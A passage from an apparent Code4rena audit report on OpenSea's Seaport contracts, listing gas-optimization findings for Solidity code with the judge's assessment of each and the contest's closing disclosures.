!channelPreviouslyOpen)` instead of `!isOpen && channelPreviouslyOpen`:\n\n```diff\nFile: ConduitController.sol\n- 141:         if (isOpen && !channelPreviouslyOpen) {\n+ 141:         if (!(!isOpen || channelPreviouslyOpen))\n...\n- 149:         } else if (!isOpen && channelPreviouslyOpen) {\n+ 149:         } else if (!(isOpen || !channelPreviouslyOpen))\n```\n\n*   `OrderValidator.sol#_validateOrderAndUpdateStatus()`\n\nUse `!(!(numerator < denominator) || !_doesNotSupportPartialFills(orderParameters.orderType))` instead of `numerator < denominator && _doesNotSupportPartialFills(orderParameters.orderType`:\n\n```diff\ncontracts/lib/OrderValidator.sol:\n  142          if (\n-  143:             numerator < denominator &&\n-  144              _doesNotSupportPartialFills(orderParameters.orderType)\n+  143:             !(!(numerator < denominator) ||\n+  144              !_doesNotSupportPartialFills(orderParameters.orderType))\n  145          ) {\n```\n\n*   `OrderValidator.sol#_cancel()`\n\nUse `!(msg.sender == offerer || msg.sender == zone)` instead of `msg.sender != offerer && msg.sender != zone` here:\n\n```diff\n-  280:                 if (msg.sender != offerer && msg.sender != zone) {\n+  280:                 if (!(msg.sender == offerer || msg.sender == zone))\n```\n\n*   `SignatureVerification.sol#_assertValidSignature()`\n\nUse `!(v == 27 || v == 28)` instead of `v != 27 && v != 28`:\n\n```diff\ncontracts/lib/SignatureVerification.sol:\n-  78:             if (v != 27 && v != 28) {\n+  78:             if (!(v == 27 || v == 28))\n```\n\n*   `ZoneInteraction.sol#_assertRestrictedBasicOrderValidity()`\n\nUse `!(!(uint256(orderType) > 1) || msg.sender == zone || msg.sender == offerer)` instead of `uint256(orderType) > 1 && msg.sender != zone && msg.sender != offerer`:\n\n```diff\ncontracts/lib/ZoneInteraction.sol:\n   46          if (\n-   47:             uint256(orderType) > 1 &&\n-   48:             msg.sender != zone &&\n-   49              msg.sender != offerer\n+   47:             !(!(uint256(orderType) > 1) ||\n+   48:             msg.sender == zone ||\n+   49              msg.sender == offerer)\n   50          ) {\n```\n\n*   `ZoneInteraction.sol#_assertRestrictedAdvancedOrderValidity()` (1)\n\nUse `!(!(uint256(orderType) > 1) || msg.sender == zone || msg.sender == offerer)` instead of `uint256(orderType) > 1 && msg.sender != zone && msg.sender != offerer`:\n\n```diff\n  115          if (\n-  116:             uint256(orderType) > 1 &&\n-  117:             msg.sender != zone &&\n-  118              msg.sender != offerer\n+  116:             !(!(uint256(orderType) > 1) ||\n+  117:             msg.sender == zone ||\n+  118              msg.sender == offerer)\n  119          ) {\n```\n\n*   `ZoneInteraction.sol#_assertRestrictedAdvancedOrderValidity()` (2)\n\nUse `!(advancedOrder.extraData.length != 0 || criteriaResolvers.length != 0)` instead of `advancedOrder.extraData.length == 0 && criteriaResolvers.length == 0`:\n\n```diff\n  121              if (\n-  122:                 advancedOrder.extraData.length == 0 &&\n-  123                  criteriaResolvers.length == 0\n+  122:                 !(advancedOrder.extraData.length != 0 ||\n+  123                  criteriaResolvers.length != 0)\n  124              ) {\n```\n\n## [G-11]  Bytes constants are more efficient than string constants\n\nFrom the [Solidity doc](\\[https://docs.soliditylang.org/en/develop/types.html#dynamically-sized-byte-array]\\(https://docs.soliditylang.org/en/develop/types.html#dynamically-sized-byte-array\\)):\n\n> If you can limit the length to a certain number of bytes, always use one of bytes1 to bytes32 because they are much cheaper.\n\n[Why do Solidity examples use bytes32 type instead of string?](https://ethereum.stackexchange.com/questions/3795/why-solidity-uses-bytes32-type-instead-of-string)\n\n> bytes32 uses less gas because it fits in a single word of the EVM, and string is a dynamically sized-type which has current limitations in Solidity (such as can't be returned from a function to a contract).\n\nIf data can fit into 32 bytes, then you should use bytes32 datatype rather than bytes or strings as it is cheaper in solidity. Basically, any fixed size variable in solidity is cheaper than variable size. That will save gas on the contract.\n\nInstances of `string constant` that can be replaced by `bytes(1..32) constant` :\n\n```solidity\nreference/lib/ReferenceConsiderationBase.sol:\n  29:     string internal constant _NAME = \"Consideration\";\n  30:     string internal constant _VERSION = \"rc.1\";\n```\n\n## [G-12] An array's length should be cached to save gas in for-loops\n\nReading array length at each iteration of the loop consumes more gas than necessary.\n\nIn the best case scenario (length read on a memory variable), caching the array length in the stack saves around 3 gas per iteration.\nIn the worst case scenario (external calls at each iteration), the amount of gas wasted can be massive.\n\nHere, lengths are only read from memory.\n\nConsider storing the array's length in a variable before the for-loop, and use this newly created variable instead:\n\n```solidity\nlib/OrderCombiner.sol:247:                for (uint256 j = 0; j < offer.length; ++j) {\nlib/OrderCombiner.sol:291:                for (uint256 j = 0; j < consideration.length; ++j) {\nlib/OrderCombiner.sol:598:                for (uint256 j = 0; j < consideration.length; ++j) {\nlib/OrderCombiner.sol:621:        for (uint256 i = 0; i < executions.length; ) {\nlib/OrderFulfiller.sol:217:            for (uint256 i = 0; i < orderParameters.offer.length; ) {\nlib/OrderFulfiller.sol:306:            for (uint256 i = 0; i < orderParameters.consideration.length; ) {\n```\n\n## [G-13] Increments can be unchecked\n\nIn Solidity 0.8+, there's a default overflow check on unsigned integers. It's possible to uncheck this in for-loops and save some gas at each iteration, but at the cost of some code readability, as this uncheck cannot be made inline.\n\n[ethereum/solidity#10695](https://github.com/ethereum/solidity/issues/10695)\n\n### Affected code\n\n```solidity\nlib/CriteriaResolution.sol:56:            for (uint256 i = 0; i < totalCriteriaResolvers; ++i) {\nlib/CriteriaResolution.sol:166:            for (uint256 i = 0; i < totalAdvancedOrders; ++i) {\nlib/CriteriaResolution.sol:184:                for (uint256 j = 0; j < totalItems; ++j) {\nlib/CriteriaResolution.sol:199:                for (uint256 j = 0; j < totalItems; ++j) {\nlib/OrderCombiner.sol:181:            for (uint256 i = 0; i < totalOrders; ++i) {\nlib/OrderCombiner.sol:247:                for (uint256 j = 0; j < offer.length; ++j) {\nlib/OrderCombiner.sol:291:                for (uint256 j = 0; j < consideration.length; ++j) {\nlib/OrderCombiner.sol:373:            for (uint256 i = 0; i < totalOrders; ++i) {\nlib/OrderCombiner.sol:473:            for (uint256 i = 0; i < totalOfferFulfillments; ++i) {\nlib/OrderCombiner.sol:498:            for (uint256 i = 0; i < totalConsiderationFulfillments; ++i) {\nlib/OrderCombiner.sol:577:            for (uint256 i = 0; i < totalOrders; ++i) {\nlib/OrderCombiner.sol:598:                for (uint256 j = 0; j < consideration.length; ++j) {\nlib/OrderCombiner.sol:754:            for (uint256 i = 0; i < totalFulfillments; ++i) {\nlib/OrderFulfiller.sol:471:            for (uint256 i = 0; i < totalOrders; ++i) {\n```\n\nThe code would go from:\n\n```solidity\nfor (uint256 i; i < numIterations; ++i) {\n // ...  \n}  \n```\n\nto:\n\n```solidity\nfor (uint256 i; i < numIterations;) {  \n // ...  \n unchecked { ++i; }\n}  \n```\n\nThe risk of overflow is inexistant for `uint256` here.\n\nNote that this is already applied at some places in the solution. As an example:\n\n```solidity\ncontracts/conduit/Conduit.sol:\n   66:         for (uint256 i = 0; i < totalStandardTransfers; ) {\n   ...\n   74:             unchecked {\n   75                  ++i;\n   76              }\n\n  130:         for (uint256 i = 0; i < totalStandardTransfers; ) {\n  ...\n  138:             unchecked {\n  139                  ++i;\n  140              }\n\ncontracts/lib/BasicOrderFulfiller.sol:\n   948:         for (uint256 i = 0; i < totalAdditionalRecipients; ) {\n   ...\n   975:             unchecked {\n   976                  ++i;\n   977              }\n\n   \n  1040:         for (uint256 i = 0; i < totalAdditionalRecipients; ) {\n  ...\n  1064:             unchecked {\n  1065                  ++i;\n  1066              }\n```\n\n## [G-14] No need to explicitly initialize variables with default values\n\n*This finding is only true without the Optimizer*\n\nIf a variable is not set/initialized, it is assumed to have the default value (`0` for `uint`, `false` for `bool`, `address(0)` for address...). Explicitly initializing it with its default value is an anti-pattern and wastes gas.\n\nAs an example: `for (uint256 i = 0; i < numIterations; ++i) {` should be replaced with `for (uint256 i; i < numIterations; ++i) {`\n\nAffected code:\n\n```solidity\nconduit/Conduit.sol:66:        for (uint256 i = 0; i < totalStandardTransfers; ) {\nconduit/Conduit.sol:130:        for (uint256 i = 0; i < totalStandardTransfers; ) {\nlib/AmountDeriver.sol:44:            uint256 extraCeiling = 0;\nlib/BasicOrderFulfiller.sol:948:        for (uint256 i = 0; i < totalAdditionalRecipients; ) {\nlib/BasicOrderFulfiller.sol:1040:        for (uint256 i = 0; i < totalAdditionalRecipients; ) {\nlib/CriteriaResolution.sol:56:            for (uint256 i = 0; i < totalCriteriaResolvers; ++i) {\nlib/CriteriaResolution.sol:166:            for (uint256 i = 0; i < totalAdvancedOrders; ++i) {\nlib/CriteriaResolution.sol:184:                for (uint256 j = 0; j < totalItems; ++j) {\nlib/CriteriaResolution.sol:199:                for (uint256 j = 0; j < totalItems; ++j) {\nlib/OrderCombiner.sol:181:            for (uint256 i = 0; i < totalOrders; ++i) {\nlib/OrderCombiner.sol:247:                for (uint256 j = 0; j < offer.length; ++j) {\nlib/OrderCombiner.sol:291:                for (uint256 j = 0; j < consideration.length; ++j) {\nlib/OrderCombiner.sol:373:            for (uint256 i = 0; i < totalOrders; ++i) {\nlib/OrderCombiner.sol:470:            uint256 totalFilteredExecutions = 0;\nlib/OrderCombiner.sol:473:            for (uint256 i = 0; i < totalOfferFulfillments; ++i) {\nlib/OrderCombiner.sol:498:            for (uint256 i = 0; i < totalConsiderationFulfillments; ++i) {\nlib/OrderCombiner.sol:577:            for (uint256 i = 0; i < totalOrders; ++i) {\nlib/OrderCombiner.sol:598:                for (uint256 j = 0; j < consideration.length; ++j) {\nlib/OrderCombiner.sol:621:        for (uint256 i = 0; i < executions.length; ) {\nlib/OrderCombiner.sol:751:            uint256 totalFilteredExecutions = 0;\nlib/OrderCombiner.sol:754:            for (uint256 i = 0; i < totalFulfillments; ++i) {\nlib/OrderFulfiller.sol:217:            for (uint256 i = 0; i < orderParameters.offer.length; ) {\nlib/OrderFulfiller.sol:306:            for (uint256 i = 0; i < orderParameters.consideration.length; ) {\nlib/OrderFulfiller.sol:471:            for (uint256 i = 0; i < totalOrders; ++i) {\nlib/OrderValidator.sol:272:            for (uint256 i = 0; i < totalOrders; ) {\nlib/OrderValidator.sol:350:            for (uint256 i = 0; i < totalOrders; ) {\n```\n\nI suggest removing explicit initializations for default values.\n\n## [G-15] `abi.encode()` is less efficient than `abi.encodePacked()`\n\nChanging `abi.encode` function to `abi.encodePacked` can save gas since the `abi.encode` function pads extra null bytes at the end of the call data, which is unnecessary. Also, in general, `abi.encodePacked` is more gas-efficient (see [Solidity-Encode-Gas-Comparison](https://github.com/ConnorBlockchain/Solidity-Encode-Gas-Comparison)).\n\nConsider using `abi.encodePacked()` here:\n\n```solidity\ncontracts/lib/ConsiderationBase.sol:\n  77          return keccak256(\n  78:             abi.encode(\n  79                  _EIP_712_DOMAIN_TYPEHASH,\n  80                  _NAME_HASH,\n  81                  _VERSION_HASH,\n  82                  block.chainid,\n  83                  address(this)\n  84              )\n  85          );\n```\n\nConsider using the assembly equivalent for `abi.encodePacked()` here:\n\n```solidity\nreference/lib/ReferenceBasicOrderFulfiller.sol:\n  513          orderHash = keccak256(\n  514:             abi.encode(\n  515                  hashes.typeHash,\n  516                  parameters.offerer,\n  517                  parameters.zone,\n  518                  hashes.offerItemsHash,\n  519                  hashes.receivedItemsHash,\n  520                  fulfillmentItemTypes.orderType,\n  521                  parameters.startTime,\n  522                  parameters.endTime,\n  523                  parameters.zoneHash,\n  524                  parameters.salt,\n  525                  parameters.offererConduitKey,\n  526                  nonce\n  527              )\n  528          );\n\n  609              hashes.considerationHashes[0] = keccak256(\n  610:                 abi.encode(\n  611                      hashes.typeHash,\n  612                      primaryConsiderationItem.itemType,\n  613                      primaryConsiderationItem.token,\n  614                      primaryConsiderationItem.identifierOrCriteria,\n  615                      primaryConsiderationItem.startAmount,\n  616                      primaryConsiderationItem.endAmount,\n  617                      primaryConsiderationItem.recipient\n  618                  )\n  619              );\n\n  684                  hashes.considerationHashes[recipientCount + 1] = keccak256(\n  685:                     abi.encode(\n  686                          hashes.typeHash,\n  687                          additionalRecipientItem.itemType,\n  688                          additionalRecipientItem.token,\n  689                          additionalRecipientItem.identifierOrCriteria,\n  690                          additionalRecipientItem.startAmount,\n  691                          additionalRecipientItem.endAmount,\n  692                          additionalRecipientItem.recipient\n  693                      )\n  694                  );\n  695              }\n\n  756                  keccak256(\n  757:                     abi.encode(\n  758                          hashes.typeHash,\n  759                          offerItem.itemType,\n  760                          offerItem.token,\n  761                          offerItem.identifier,\n  762                          offerItem.amount,\n  763                          offerItem.amount //Assembly uses OfferItem instead of SpentItem.\n  764                      )\n  765                  )\n\nreference/lib/ReferenceConsiderationBase.sol:\n  117          return keccak256(\n  118:             abi.encode(\n  119                  _eip712DomainTypeHash,\n  120                  _nameHash,\n  121                  _versionHash,\n  122                  block.chainid,\n  123                  address(this)\n  124              )\n  125          );\n\nreference/lib/ReferenceGettersAndDerivers.sol:\n   41          return\n   42              keccak256(\n   43:                 abi.encode(\n   44                      _OFFER_ITEM_TYPEHASH,\n   45                      offerItem.itemType,\n   46                      offerItem.token,\n   47                      offerItem.identifierOrCriteria,\n   48                      offerItem.startAmount,\n   49                      offerItem.endAmount\n   50                  )\n   51              );\n   52      }\n\n   66          return\n   67              keccak256(\n   68:                 abi.encode(\n   69                      _CONSIDERATION_ITEM_TYPEHASH,\n   70                      considerationItem.itemType,\n   71                      considerationItem.token,\n   72                      considerationItem.identifierOrCriteria,\n   73                      considerationItem.startAmount,\n   74                      considerationItem.endAmount,\n   75                      considerationItem.recipient\n   76                  )\n   77              );\n\n  123          return\n  124              keccak256(\n  125:                 abi.encode(\n  126                      _ORDER_TYPEHASH,\n  127                      orderParameters.offerer,\n  128                      orderParameters.zone,\n  129                      keccak256(abi.encodePacked(offerHashes)),\n  130                      keccak256(abi.encodePacked(considerationHashes)),\n  131                      orderParameters.orderType,\n  132                      orderParameters.startTime,\n  133                      orderParameters.endTime,\n  134                      orderParameters.zoneHash,\n  135                      orderParameters.salt,\n  136                      orderParameters.conduitKey,\n  137                      nonce\n  138                  )\n  139              );\n```\n\nNotice that this is already used at other places for a similar situation:\n\n```solidity\nreference/lib/ReferenceBasicOrderFulfiller.sol:\n  769              hashes.offerItemsHash = keccak256(\n  770                  abi.encodePacked(offerItemHashes)\n  771              );\n\nreference/lib/ReferenceGettersAndDerivers.sol:\n  129                      keccak256(abi.encodePacked(offerHashes)),\n  130                      keccak256(abi.encodePacked(considerationHashes)),\n```\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/71#issuecomment-1166544712):**\n > **[G-01] Cheap Contract Deployment Through Clones**<br>\n> \n> Deploying clones would save cost when Conduits are created, however it also increases the cost to use the conduits created. That increase has a tiny impact, but I assume it was intentional to favor the end-users here - creating conduits will be relatively rare and reserved for platforms and/or power users.\n> \n> **[G-02] ConduitController.sol#createConduit(): Help the optimizer by saving a storage variable's reference instead of repeatedly fetching it**<br>\n> \n> This general tactic can often result in significant savings, but I ran the recommended change and here it only saves ~100 gas on `createConduit`.\n> \n> **[G-03] ConduitController.sol#acceptOwnership(): Help the optimizer by saving a storage variable's reference instead of repeatedly fetching it**<br>\n> \n> This will save some gas, but `acceptOwnership` is not a critical code path so an optimization here would not impact many transactions.\n> \n> **[G-04] `OrderValidator.sol#_validateBasicOrderAndUpdateStatus():` Help the optimizer by saving a storage variable's reference instead of repeatedly fetching it**<br>\n> \n> This is similar to the recommendation in issue [#60](https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/60) (although #60 appears to be a bit more thorough) and provides fairly significant savings on critical code paths.\n> \n> **[G-05] `OrderValidator.sol#_validateBasicOrderAndUpdateStatus():` avoid an unnecessary SSTORE by not writing a default value**<br>\n> \n> This is a safe change to make since `_verifyOrderStatus` will first revert if the order is already canceled. Considered independently from the rec above, this saves ~300 gas on `fulfillBasicOrder`.\n> \n> **[G-06] OrderCombiner.sol: ++totalFilteredExecutions costs less gas compared to totalFilteredExecutions += 1**<br>\n> **[G-07] OrderCombiner.sol: --maximumFulfilled costs less gas compared to maximumFulfilled--**<br>\n> **[G-08] `FulfillmentApplier.sol#_applyFulfillment():` Unchecking arithmetics operations that can't underflow/overflow**<br>\n> **[G-09] /reference: Unchecking arithmetics operations that can't underflow/overflow**<br>\n> **[G-12] An array's length should be cached to save gas in for-loops**<br>\n> **[G-13] Increments can be unchecked**<br>\n> \n> Yes these should provide some savings.\n> \n> **[G-10] `OR` conditions cost less than their equivalent `AND` conditions (\"NOT(something is false)\" costs less than \"everything is true\")**<br>\n> \n> It's unfortunate that the optimizer cannot handle scenarios like this automatically... There does appear to be a small win here, but it's debatable whether the impact to readability is worth it here.\n> \n> **[G-11] Bytes constants are more efficient than string constants**<br>\n> \n> These changes seem to be focused on getters, it's not clear it would impact gas for any transactions.\n> \n> **[G-14] No need to explicitly initialize variables with default values**<br>\n> \n> This appears to be handled by the optimizer automatically now. Testing did not change the gas results.\n> \n> **[G-15] abi.encode() is less efficient than abi.encodePacked()**<br>\n> \n> This recommendation causes tests to fail, suggesting this change violates the EIP-712 standard.\n\n\n\n***\n\n# Disclosures\n\nC4 is an open organization governed by participants in the community.\n\nC4 Contests incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Contest submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.\n\nC4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.\n"
}